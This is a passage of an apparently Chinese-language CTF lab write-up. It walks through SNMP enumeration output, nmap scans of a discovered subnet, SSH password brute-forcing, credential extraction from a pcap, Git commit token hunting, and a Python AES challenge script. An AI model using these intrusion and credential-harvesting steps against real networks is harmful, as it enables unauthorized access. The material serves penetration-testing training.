class="number">.1</span><span class="number">.1</span><span class="number">.0</span> = STRING: <span class="string">"VyOS 1.2-rolling-201910230117"</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.0</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.4</span><span class="number">.1</span><span class="number">.44641</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.0</span> = Timeticks: (<span class="number">537483</span>) <span class="number">1</span>:<span class="number">29</span>:<span class="number">34.83</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.4</span><span class="number">.0</span> = STRING: <span class="string">"root"</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.5</span><span class="number">.0</span> = STRING: <span class="string">"J09tV3rN1wd"</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.6</span><span class="number">.0</span> = STRING: <span class="string">"Unknown"</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.7</span><span class="number">.0</span> = INTEGER: <span class="number">14</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.8</span><span class="number">.0</span> = Timeticks: (<span class="number">4</span>) <span class="number">0</span>:<span class="number">00</span>:<span class="number">00.04</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.6</span><span class="number">.3</span><span class="number">.11</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.6</span><span class="number">.3</span><span class="number">.15</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.3</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.6</span><span class="number">.3</span><span class="number">.10</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.4</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.6</span><span class="number">.3</span><span class="number">.1</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.5</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.49</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.6</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.4</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.7</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.50</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.8</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.6</span><span class="number">.3</span><span class="number">.16</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.9</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.6</span><span class="number">.3</span><span class="number">.13</span><span class="number">.3</span><span class="number">.1</span><span class="number">.3</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.2</span><span class="number">.10</span> = OID: iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.92</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span> = STRING: <span class="string">"The MIB for Message Processing and Dispatching."</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.3</span><span class="number">.2</span> = STRING: <span class="string">"The management information definitions for the SNMP User-based Security Model."</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.3</span><span class="number">.3</span> = STRING: <span class="string">"The SNMP Management Architecture MIB."</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.3</span><span class="number">.4</span> = STRING: <span class="string">"The MIB module for SNMPv2 entities"</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.3</span><span class="number">.5</span> = STRING: <span class="string">"The MIB module for managing TCP implementations"</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.3</span><span class="number">.6</span> = STRING: <span class="string">"The MIB module for managing IP and ICMP implementations"</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.1</span><span class="number">.9</span><span class="number">.1</span><span class="number">.3</span><span class="number">.7</span> = STRING: <span class="string">"The MIB module for managing UDP implementations"</span></span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<h5 id="User"><a href="#User" class="headerlink" title="User"></a>User</h5><p>通过SNMP发现另一个网络172.16.60.x</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.20</span><span class="number">.3</span> = Counter32: <span class="number">0</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.21</span><span class="number">.1</span> = Gauge32: <span class="number">0</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.21</span><span class="number">.2</span> = Gauge32: <span class="number">0</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.21</span><span class="number">.3</span> = Gauge32: <span class="number">0</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.22</span><span class="number">.1</span> = OID: ccitt<span class="number">.0</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.22</span><span class="number">.2</span> = OID: ccitt<span class="number">.0</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.22</span><span class="number">.3</span> = OID: ccitt<span class="number">.0</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.1</span> = INTEGER: <span class="number">2</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.11</span> = INTEGER: <span class="number">2</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.20</span> = INTEGER: <span class="number">2</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.2</span> = INTEGER: <span class="number">3</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.3</span> = INTEGER: <span class="number">3</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.4</span> = INTEGER: <span class="number">3</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.5</span> = INTEGER: <span class="number">3</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.1</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> FE <span class="number">97</span> AF </span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.11</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> <span class="number">1</span>B E6 <span class="number">89</span> </span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.20</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> AF B6 D6 </span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.2</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> <span class="number">3</span>B <span class="number">85</span> <span class="number">71</span> </span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.3</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> <span class="number">0</span>B <span class="number">82</span> <span class="number">36</span> </span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.4</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> <span class="number">89</span> <span class="number">9</span>D <span class="number">3</span>E </span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.2</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.5</span> = Hex-STRING: <span class="number">08</span> <span class="number">00</span> <span class="number">27</span> <span class="number">5</span>A <span class="number">1</span>E <span class="number">03</span> </span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.1</span> = IpAddress: <span class="number">172.16</span><span class="number">.50</span><span class="number">.1</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.11</span> = IpAddress: <span class="number">172.16</span><span class="number">.50</span><span class="number">.11</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.2</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.50</span><span class="number">.20</span> = IpAddress: <span class="number">172.16</span><span class="number">.50</span><span class="number">.20</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.2</span> = IpAddress: <span class="number">172.16</span><span class="number">.60</span><span class="number">.2</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.3</span> = IpAddress: <span class="number">172.16</span><span class="number">.60</span><span class="number">.3</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.4</span> = IpAddress: <span class="number">172.16</span><span class="number">.60</span><span class="number">.4</span></span><br><span class="line">iso<span class="number">.3</span><span class="number">.6</span><span class="number">.1</span><span class="number">.2</span><span class="number">.1</span><span class="number">.3</span><span class="number">.1</span><span class="number">.1</span><span class="number">.3</span><span class="number">.3</span><span class="number">.1</span><span class="number">.172</span><span class="number">.16</span><span class="number">.60</span><span class="number">.5</span> = IpAddress: <span class="number">172.16</span><span class="number">.60</span><span class="number">.5</span></span><br></pre></td></tr></table></figure>
<p>扫描一下端口开放  </p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.60.3</span><br><span class="line">Host is up, received user-<span class="builtin-name">set</span> (0.50s latency).</span><br><span class="line">Scanned at 2020-01-07 20:16:25 EST <span class="keyword">for</span> 126s</span><br><span class="line"><span class="keyword">Not</span> shown: 999 filtered ports</span><br><span class="line">Reason: 999 no-responses</span><br><span class="line">Some closed ports may be reported as filtered due <span class="keyword">to</span> --defeat-rst-ratelimit</span><br><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.60.4</span><br><span class="line">Host is up, received user-<span class="builtin-name">set</span> (0.62s latency).</span><br><span class="line">Scanned at 2020-01-07 20:16:25 EST <span class="keyword">for</span> 129s</span><br><span class="line"><span class="keyword">Not</span> shown: 999 filtered ports                                                                  </span><br><span class="line">Reason: 999 no-responses                                                                       </span><br><span class="line">Some closed ports may be reported as filtered due <span class="keyword">to</span> --defeat-rst-ratelimit                    </span><br><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62</span><br><span class="line"></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 172.16.60.5</span><br><span class="line">Host is up, received user-<span class="builtin-name">set</span> (0.58s latency).</span><br><span class="line">Scanned at 2020-01-07 20:16:25 EST <span class="keyword">for</span> 127s</span><br><span class="line"><span class="keyword">Not</span> shown: 999 filtered ports</span><br><span class="line">Reason: 999 no-responses</span><br><span class="line">Some closed ports may be reported as filtered due <span class="keyword">to</span> --defeat-rst-ratelimit</span><br><span class="line">PORT   STATE<span class="built_in"> SERVICE </span>REASON</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 62</span><br></pre></td></tr></table></figure>
<p>仅开放ssh服务，利用之前收集到的用户名爆破一波  </p>
<p><img src="/images/pasted-84.png" alt="upload successful"><br>同一口令可以登录这四台服务器，挨个儿翻一遍（估计作者为了增加难度，BAN了find大法，在其中一台/opt目录下发现<code>t@ken</code>文件，( ╯□╰ )），继续信息收集，发现ssh密钥对，一个dump文件，全都下载回本地。（PS，作者喜欢在/opt下塞东西，从之前放token的位置可以看出来）<br>file命令看一下dump文件，是一个pcap数据报文文件，先strings+grep找一下token  </p>
<p><img src="/images/pasted-85.png" alt="upload successful"><br>看样子像一个web登录请求，用wireshark继续分析改文件  </p>
<h5 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h5><p><img src="/images/pasted-86.png" alt="upload successful"><br>对应咱们收集的域名列表，172.16.0.21是git服务器，这个登录密码应该就是Git登录账密，拿去登录成功  </p>
<p><img src="/images/pasted-87.png" alt="upload successful"><br>查看提交记录，发现token  </p>
<p><img src="/images/pasted-88.png" alt="upload successful">  </p>
<h5 id="Certificate"><a href="#Certificate" class="headerlink" title="Certificate"></a>Certificate</h5><p>这个题目最早出现是在Mail那一关，从邮箱下载回来一个Certificate文件，当时没太懂python的Module怎么逆，群友提示先别硬刚，就放一边了，原来在仓库有源码。  </p>
<p>`````  </p>
<p>from hashlib import md5<br>from base64 import b64decode<br>from base64 import b64encode<br>from Crypto.Cipher import AES<br>from Crypto.Random import get_random_bytes<br>from Crypto.Util.Padding import pad, unpad</p>
<p>certif = “””<br>06zS/3il0IzOOzBm+H9phw4vwWyaJNbbQab128Uta3JZOu0BjNA8+p2bZzXhOJgjAteUPb2UHbTMLFGwuv9b/mJK5e8iRwzsXcqwYDNv1R8rNRz9zCI1vIYC<br>82kQMtkJHmIX9TsYi/XfhjAKSWHwIyVGF0ZULb33+T+BfhXoHTq17mhbPp67n/pEZvCphLa1NszGtbBVkGN9bNvCsRlh2MqBLe9pLGSy79wVYCC+XTvDMnbE<br>wMWej68xi9L5dfPQtFnMjiEMeEQBKlhK58T5zf2srC/bd4qfdljf0FKUvQhLzKBSTdUXy/kxveqOGWbrvGMbAlW7/DSRSNAtB4PLIBArTw4sphNF+sexOcRz<br>1gRkVMK/ciEvWZf+4eJ5E7uNwsjEOCdIYOfusfv6hO45iw0aNJ2ooADTXAwlRHnW0zR2xgBcHOe7xsEnpIHF8HYfX5YAo67vyJkkzjdlpy8Gw71z7wC5l2+1<br>6JAJK0Vl9ScC+WgBZIt6ZnXxglY/jQUxWCRMQZX8FXrSw2C+P/k4BRK/usb8Pa9U2bsjUagMQ5lPlSJptvv17j4UZU6uzsKyCDbm9QdbyoA59jKQ8OEQj4gL<br>vu1SrM3UVSQzIrBbqs65GuTcNWa7GoSi9nZx7Ob2cmYLR27YV8wlDnijrlZNgYiOMreiluk/24TxJxGmakOALae/0dWcJSQsX2T76kx+QjBhEjIlDjXdsUEp<br>2m38rKlvpeRH8ZuKhFa21HQKLOHhXylPjcDv79vvuAfkwMnleaPV8NMG5wL5ailNuouAbszIclMoTA4r6Vl3AiZmINALc0j2TM0b5hpw7ArNbcNzKNqdsRE5<br>8o+mmCg69z20eL6XvywxCMz+gnS4c3KHm2sc4qW20LAWN5Y1nG9qIJxEhMKustcC/KyaRQ+ZKkvnWZRkQt2s5+/j2xMg8h5N5bEtd5pwmJAzI/E4Lt7yZI+E<br>O7KUXwem3wc+Ruauyy5G8Rrow8WuQxaYqHtm5bx+wiZd5srUyzKImL3j1FVP/HUkT1lgLKFqcMs3fsHg6nNweQkF7Vk/85+9wp3YGEge07z1Kf1cj9jhukGX<br>LHHma/XXjnNMuBzZ/T/HyjlhO/BU1lMI5Z2n8F3ams97fyiAa725Z8YLAuTMP6jAJYeeZUPEXgvzUWtRpLvWh9uHh1AUlA4TXTyZb/tO3GopwdjQFkhOHWfP<br>J64pQf8xazvB0OtiFrGYrxx9GF42Ou/zVxHtrF/G0niMVvnnQtV1C9aa9692Knc+1ayPf2zXi9x03wlRXAqp/uW5+V30fynHtzaa6DXOmye8nBi/26ULGTAG<br>STlzrnLfcljAu8w87t5oE2KGpopaQp0p5Fwo8Vv7m3HJ4YZGeJ6AGzWKN/WBLtw3cV84g3ZLf//lCq0X16FFCCdA/5Iu/WDLO2A3GY+ml2g3lXGv4eQ6TIGA<br>TImZ4KYiGRkqIWz6Fxu3rZ387c87khFHTXH2p0yAJpMtXh2x303qQg1wYwivKawSjZwrWenBWUTr361plUJRjCty+k8tVUS9n0lbNlVf1cGfZcIEJfGlOT6v<br>M+jnPpLl6oINEYxsVVbXujuaV+RnIo2s17tm0uy+zbWc3ZZCN/eKNZ4dfB0+FM7VdZ/unvvEfZ/J71IpY4Fp0k2/fHNHGXVZlF/ZVuHyXttf1t0Xlvu9lUuN<br>k0iSnKUKhpE9JoyaK85U4w7Pruo5SdAWu5G/SeiRJzd0ns2Vm+rFZR+2MoaU3cq0gISOBNDBCJwWzA+EorgltJvletqGbNYOS2R3Z4sVVDCZJRn399bCMFY2<br>AHV7za+p1S13RRK4hR6M57S4gBYW60Yq7zWUOUPgUanFbIF7KOB3M6X0JTJmMTjD9X+fZXuvZxPeqyhiM3YFPt0dazEHorqFhC7lzyUFMIiPR+IYX7UXl6IS<br>kxdKUGzEyeyH+NCejoZj0AIEn/17s6yRhlfRoZq26njlOrAJvPJXWmX4ycHd3kKBp1DTbKTuEp6kvFeFLVG/Rgcb9hXq6YDCeAvw/0xXMzRE6GLGmUYZaWEk<br>UO9ntXUsqUnzTfKCzooPkBb3oVVY9HvJV8jI6TP+hK3xrV1QbSPouRroCkeTWQ2WvkmGHcX4elfhjo7rB5AOlqbTolR6d+sEvMzjbIDvSh2uRSgXm55GVZB0<br>nfsh2PTXyQgrNe2dNU2gFUBIaWWLRI+U8lmRqd7rxOGRlm7Qp5h/lbDkkjXQX38NjE+7hssPhqOfC5gNKrli5cqm1GldRIgM19y+dw==<br>“””</p>
<p>cyphered = “””9FRznJq2IO9ubbW+MvuwEIf4oS9VlIB/H+ygdD1OZp+/q1AF1bwtHlpP7IqTUrTd”””</p>
<p>d = “””<br> PC10-a=0H<br> !ejkl;F97<br> fhNjkRc12<br> DFlT21K54<br> l(8Ee15AA<br> LC,$T$2I!<br> 1JHG11T12<br> tJUf24D17<br> 34e6GDHIT<br>“””</p>
<p>class AESCipher:<br>    def <strong>init</strong>(self, key):<br>        self.key = md5(key.encode(‘utf8’)).digest()</p>
<pre><code>def encrypt(self, data):
    iv = get_random_bytes(AES.block_size)
    self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
    return b64encode(iv + self.cipher.encrypt(pad(data.encode(&apos;utf-8&apos;), AES.block_size)))

def decrypt(self, data):
    raw = b64decode(data)
    self.cipher = AES.new(self.key, AES.MODE_CBC, raw[:AES.block_size])
    return unpad(self.cipher.decrypt(raw[AES.block_size:]), AES.block_size)</code></pre><p>def find_key(d):<br>    d_s = d.split()<br>    l = len(d_s) - 1<br>    key = ‘’<br>    for i in range(2):<br>        key += d_s[0][i] + d_s[0][l - i]<br>        key += d_s[l][l - i] + d_s[l][i]<br>    return key</p>
<p>def inds(pos):<br>    return pos.split(‘,’)</p>
<p>def puzzle_assembly(positions):<br>    p = positions<br>    rs = d.split()<br>    token = ‘’<br>    for it in p.split():<br>        sel = inds(it)<br>        token = ‘’.join([token, rs[int(sel[0])][int(sel[1])]])<br>    return token</p>
<p>def main():<br>    key = find_key(d)<br>    poss = AESCipher(key).decrypt(cyphered).decode(‘utf-8’)<br>    pwd = input(‘Please, input password:’)<br>    passw = puzzle_assembly(poss)</p>
<pre><code>if pwd == passw:
    # print (&apos;KEY in d =&apos;, key)
    # print (&apos;poss =&apos;, poss)
    # print (&apos;PASSWORD =&apos;, passw)
    certificate = AESCipher(passw).decrypt(certif).decode(&apos;utf-8&apos;)
    print(&apos;Your certificate: \n%s&apos; % (certificate))
else:
    print(&quot;Yor password is not correct!&quot;)</code></pre><p>if <strong>name</strong> == “<strong>main</strong>“:<br>    main()</p>
<pre><code>
